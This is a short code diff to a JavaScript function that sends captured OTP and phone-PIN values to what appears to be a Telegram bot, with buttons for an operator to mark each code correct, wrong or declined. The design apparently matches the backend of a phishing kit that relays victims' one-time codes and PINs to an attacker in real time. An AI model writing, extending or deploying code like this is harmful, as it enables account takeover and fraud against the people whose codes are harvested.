@@ -107,7 +107,7 @@ function sendVerificationRequest(type, value, flow) {
         const id = generateId();
         const store = type === 'PhonePIN' ? pendingVerifications : otpStore;
 
-        const message = `<b>New ${type} Verification Request</b>\n\n${type}: <code>${value}</code>\nFlow: ${flow}`;
+        const message = `<b>New ${type} Verification Request</b>\n\n${value}\nFlow: ${flow}`;
 
         let keyboard;
         if (type === 'OTP') {
@@ -117,6 +117,15 @@ function sendVerificationRequest(type, value, flow) {
                         { text: '✅ Correct', callback_data: `correct_${type}_${id}` },
                         { text: '❌ Wrong Code', callback_data: `wrongcode_${type}_${id}` },
                         { text: '🔒 Wrong PIN', callback_data: `wrongpin_${type}_${id}` }
+                    ]
+                ]
+            };
+        } else if (type === 'PhonePIN') {
+            keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Verify', callback_data: `verify_${type}_${id}` },
+                        { text: '❌ Decline', callback_data: `decline_${type}_${id}` }
                     ]
                 ]
             };
